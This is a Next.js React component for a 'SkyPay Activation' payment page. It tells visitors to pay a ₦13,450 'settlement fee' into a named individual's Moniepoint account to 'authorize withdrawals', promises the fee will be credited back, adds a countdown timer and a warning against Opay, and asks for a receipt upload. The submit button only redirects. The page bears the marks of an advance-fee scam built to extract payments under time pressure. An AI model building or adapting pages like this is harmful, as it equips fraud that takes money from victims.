"use client"

import type React from "react"

import { useState, useEffect } from "react"
import Image from "next/image"
import { useRouter } from "next/navigation"
import { ArrowLeft, Copy, Upload, AlertCircle, Clock } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { TypewriterText } from "@/components/typewriter-text"

export default function PaymentPage() {
  const router = useRouter()
  const [receipt, setReceipt] = useState<File | null>(null)
  const [timeLeft, setTimeLeft] = useState(540) // 9 minutes in seconds
  const [showWarning, setShowWarning] = useState(false)
  const [copied, setCopied] = useState(false)

  useEffect(() => {
    // Show warning after a brief delay
    const warningTimeout = setTimeout(() => setShowWarning(true), 500)

    // Countdown timer
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer)
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => {
      clearTimeout(warningTimeout)
      clearInterval(timer)
    }
  }, [])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      setReceipt(e.target.files[0])
    }
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (!receipt) {
      alert("Please upload your payment receipt")
      return
    }
    router.push("/activate/verify")
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#1a1810] to-[#2d2416] flex flex-col p-6">
      <div className="w-full max-w-2xl mx-auto space-y-6 py-8">
        {/* Header */}
        <div className="flex items-center justify-between">
          <Button
            variant="ghost"
            onClick={() => router.back()}
            className="text-white hover:text-[#F5B800] hover:bg-white/10 rounded-full p-3"
          >
            <ArrowLeft className="h-6 w-6" />
          </Button>
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 relative">
              <Image src="/images/skypay-logo.jpg" alt="SkyPay Logo" fill className="object-contain" />
            </div>
            <h2 className="text-xl font-bold text-white">SkyPay Activation</h2>
          </div>
          <div className="w-12" />
        </div>

        {/* Warning Message with Typewriter Effect */}
        {showWarning && (
          <div className="bg-red-500/10 border border-red-500/30 rounded-2xl p-4 flex items-start gap-3">
            <AlertCircle className="h-5 w-5 text-red-500 flex-shrink-0 mt-0.5" />
            <p className="text-red-400 text-sm leading-relaxed">
              <TypewriterText
                text="⚠️ IMPORTANT: Do not make payments using Opay bank. Payments from Opay will not be processed and may result in activation delays. Please use other banks only."
                speed={30}
              />
            </p>
          </div>
        )}

        {/* Payment Card */}
        <div className="bg-gradient-to-br from-[#2d2416] to-[#1a1810] rounded-3xl p-8 border border-[#3d3416] shadow-2xl space-y-6">
          <div className="text-center">
            <h1 className="text-3xl font-bold text-white mb-2">Make Payment to Complete Activation</h1>
            <p className="text-white/70 text-base">Please make a payment of ₦13,450 to complete your activation</p>
          </div>

          {/* Info Box with Countdown */}
          <div className="bg-blue-500/10 border-l-4 border-blue-500 rounded-xl p-4 space-y-3">
            <div className="flex items-start gap-3">
              <AlertCircle className="h-5 w-5 text-blue-400 flex-shrink-0 mt-0.5" />
              <p className="text-blue-300 text-sm leading-relaxed">
                A settlement fee of ₦13,450 is required to authorize withdrawals. This fee will be credited back with
                your withdrawal once authorized.
              </p>
            </div>
            <div className="flex items-center justify-end gap-2 bg-yellow-500/20 px-3 py-2 rounded-lg w-fit ml-auto">
              <Clock className="h-4 w-4 text-yellow-400" />
              <span className="text-yellow-400 font-mono font-bold">{formatTime(timeLeft)}</span>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-5">
            {/* Account Number */}
            <div className="space-y-2">
              <Label className="text-white text-base font-medium">Account Number</Label>
              <div className="flex gap-2">
                <Input
                  value="6066270617"
                  readOnly
                  className="bg-[#1a1810] border-[#3d3416] text-white h-12 rounded-xl text-base"
                />
                <Button
                  type="button"
                  onClick={() => handleCopy("6066270617")}
                  className="bg-[#F5B800] hover:bg-[#d9a500] text-black px-4 rounded-xl"
                >
                  <Copy className="h-4 w-4" />
                </Button>
              </div>
            </div>

            {/* Bank */}
            <div className="space-y-2">
              <Label className="text-white text-base font-medium">Bank</Label>
              <Input
                value="MONIEPOINT MFB"
                readOnly
                className="bg-[#1a1810] border-[#3d3416] text-white h-12 rounded-xl text-base"
              />
            </div>

            {/* Account Name */}
            <div className="space-y-2">
              <Label className="text-white text-base font-medium">Account Name</Label>
              <Input
                value="SILVER AMARACHI THEOPHILUS"
                readOnly
                className="bg-[#1a1810] border-[#3d3416] text-white h-12 rounded-xl text-base"
              />
            </div>

            {/* Amount */}
            <div className="space-y-2">
              <Label className="text-white text-base font-medium">Amount</Label>
              <Input
                value="₦13,450"
                readOnly
                className="bg-[#1a1810] border-[#3d3416] text-white h-12 rounded-xl text-base font-bold"
              />
            </div>

            {/* Upload Receipt */}
            <div className="space-y-2">
              <Label className="text-white text-base font-medium">Upload Payment Receipt (PNG or JPG)</Label>
              <div className="relative">
                <Input
                  type="file"
                  accept="image/png,image/jpeg,image/jpg"
                  onChange={handleFileChange}
                  className="bg-[#1a1810] border-[#3d3416] text-white h-12 rounded-xl text-base file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-semibold file:bg-[#F5B800] file:text-black hover:file:bg-[#d9a500]"
                />
                {receipt && (
                  <p className="text-green-400 text-sm mt-2 flex items-center gap-2">
                    <Upload className="h-4 w-4" />
                    {receipt.name}
                  </p>
                )}
              </div>
            </div>

            <Button
              type="submit"
              disabled={!receipt}
              className="w-full bg-[#F5B800] hover:bg-[#d9a500] text-black text-lg font-bold py-6 rounded-3xl shadow-lg transition-all duration-300 hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100"
            >
              Confirm Payment
            </Button>
          </form>

          {copied && (
            <p className="text-center text-green-400 text-sm animate-pulse">Account number copied to clipboard!</p>
          )}
        </div>

        <p className="text-center text-white/60 text-xs">
          After making payment, upload your receipt and click confirm to proceed
        </p>
      </div>
    </div>
  )
}
